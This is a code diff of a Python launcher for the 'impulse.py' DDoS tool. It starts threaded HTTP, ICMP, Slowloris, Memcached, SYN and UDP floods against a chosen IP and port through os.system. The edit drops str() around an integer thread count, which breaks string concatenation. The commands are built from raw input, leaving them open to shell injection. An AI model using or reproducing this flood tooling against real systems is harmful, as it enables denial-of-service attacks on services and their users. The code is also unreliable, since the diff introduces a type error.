@@ -94,27 +94,27 @@ threadcounted = int(threadcount)
 
 def http():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+str(threadcounted)+" --method HTTP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+threadcounted+" --method HTTP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def icmp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method ICMP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcounted+" --method ICMP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def slowloris():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SLOWLORIS")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcounted+" --method SLOWLORIS")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def memcached():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method MEMCACHED")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcounted+" --method MEMCACHED")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def syn():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SYN")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcounted+" --method SYN")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def udp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method UDP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcounted+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
 counted = count * threadcount
